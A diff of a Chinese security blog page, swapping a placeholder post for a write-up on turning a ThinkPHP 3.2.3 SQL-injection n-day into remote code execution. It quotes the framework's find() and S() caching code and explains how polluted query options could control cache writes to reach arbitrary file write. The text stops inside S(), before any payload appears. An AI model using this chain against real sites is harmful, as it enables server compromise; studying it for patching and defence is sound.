@@ -7,38 +7,38 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>Sql Rce - DELETE</title><meta name="Description" content=""><meta property="og:title" content="Sql Rce" />
+    <title>thinkphp3.2.3 nday到rce深度利用 - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="thinkphp3.2.3 nday到rce深度利用" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://ML-hacker.github.io/posts/sql-rce/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-06T14:36:23+08:00" />
-<meta property="article:modified_time" content="2024-02-06T14:36:23+08:00" />
+<meta property="article:published_time" content="2024-02-02T15:16:31+08:00" />
+<meta property="article:modified_time" content="2024-02-02T15:16:31+08:00" />
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Sql Rce"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="thinkphp3.2.3 nday到rce深度利用"/>
 <meta name="twitter:description" content=""/>
-<meta name="application-name" content="DELETE">
-<meta name="apple-mobile-web-app-title" content="DELETE">
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/sql-rce/" /><link rel="prev" href="http://ML-hacker.github.io/posts/sictf/" /><link rel="next" href="http://ML-hacker.github.io/posts/%E5%A4%A9%E5%B1%B1/" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/sql-rce/" /><link rel="prev" href="http://ML-hacker.github.io/posts/nosql-inject/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Sql Rce",
+        "headline": "thinkphp3.2.3 nday到rce深度利用",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ML-hacker.github.io/posts/sql-rce/"
-        },"genre": "posts","wordcount":  0 ,
-        "url": "http://ML-hacker.github.io/posts/sql-rce/","datePublished": "2024-02-06T14:36:23+08:00","dateModified": "2024-02-06T14:36:23+08:00","publisher": {
+        },"genre": "posts","keywords": "Thinkphp, PHP","wordcount":  1004 ,
+        "url": "http://ML-hacker.github.io/posts/sql-rce/","datePublished": "2024-02-02T15:16:31+08:00","dateModified": "2024-02-02T15:16:31+08:00","publisher": {
             "@type": "Organization",
-            "name": "Author"},"author": {
+            "name": "Delete"},"author": {
                 "@type": "Person",
-                "name": "Author"
+                "name": "Delete"
             },"description": ""
     }
     </script></head>
@@ -56,10 +56,21 @@
     <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="DELETE"><span id="desktop-header-typeit" class="typeit"></span></a>
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                     <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                         <option value="light">Light</option>
@@ -74,13 +85,29 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="DELETE"><span id="mobile-header-typeit" class="typeit"></span></a>
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
                 <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                     <option value="light">Light</option>
@@ -98,18 +125,607 @@
     <div id="search-dropdown-mobile"></div>
 </div>
 <main class="main">
-            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sql Rce</h1><div class="post-meta">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">thinkphp3.2.3 nday到rce深度利用</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
-                </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;0 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;0 minutes&nbsp;</div>
-        </div><div class="content" id="content"></div>
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-02">2024-02-02</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-02">2024-02-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1004 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>在前面两期中，我分别分析跟进了整个thinkphp的框架和find函数，根据以上这些信息加上一些想法和实践，最后也是发现了解题点。</p>
+<h1 id="start" class="headerLink">
+    <a href="#start" class="header-mark"></a>START</h1><p>首先我们还是把find方法放出来</p>
+<h2 id="find" class="headerLink">
+    <a href="#find" class="header-mark"></a>find()</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="sd">/**  
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 查询数据  
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @access public  
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @param mixed $options 表达式参数  
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @return mixed  
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">find</span><span class="p">(</span><span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="o">||</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$options</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$where</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getPk</span><span class="p">()]</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$options</span>               <span class="o">=</span> <span class="k">array</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span>      <span class="o">=</span> <span class="nv">$where</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 根据复合主键查找记录  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$pk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getPk</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$pk</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="c1">// 根据复合主键查询  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nx">array_keys</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">is_int</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                    <span class="nv">$count</span><span class="o">++</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$pk</span><span class="p">)</span> <span class="o">==</span> <span class="nv">$count</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pk</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                    <span class="nv">$where</span><span class="p">[</span><span class="nv">$field</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">                    <span class="nx">unset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="nv">$i</span><span class="o">++</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">                <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$where</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 总是查找一条记录  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 分析表达式  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$options</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_parseOptions</span><span class="p">(</span><span class="nv">$options</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 判断查询缓存  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$key</span>   <span class="o">=</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$options</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span>  <span class="o">=</span> <span class="nx">S</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$resultSet</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="nv">$options</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$resultSet</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$resultSet</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// 查询结果为空  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="k">null</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$resultSet</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$resultSet</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 读取数据后的处理  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_data</span><span class="p">(</span><span class="nv">$resultSet</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_after_find</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">returnResult</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$cache</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="nx">S</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们着重看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="c1">// 判断查询缓存
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cache</span>  <span class="o">=</span>   <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$key</span>    <span class="o">=</span>   <span class="nx">is_string</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span><span class="o">:</span><span class="nx">md5</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$options</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span>   <span class="o">=</span>   <span class="nx">S</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$cache</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$data</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span>     <span class="o">=</span>   <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="c1">// 读取数据后的处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$data</span>   <span class="o">=</span>   <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_data</span><span class="p">(</span><span class="nv">$resultSet</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_after_find</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">returnResult</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span>     <span class="o">=</span>   <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$cache</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">S</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$cache</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>两个部分，分别是从缓存取数据和存入数据的操作，因为tp3.2.3有个nday，也就是sql注入，它的where注入的原理就是污染了<code>$options</code>数组，也就是我们在下面写入数据中可以控制<code>$key</code>,<code>$data</code>,<code>$cache</code>的值，从而实现任意文件写入，但是这里有个问题,我们来到S方法</p>
+<h2 id="s" class="headerLink">
+    <a href="#s" class="header-mark"></a>S()</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">S</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">static</span> <span class="nv">$cache</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$type</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cache</span> <span class="o">=</span> <span class="nx">Think\Cache</span><span class="o">::</span><span class="na">getInstance</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
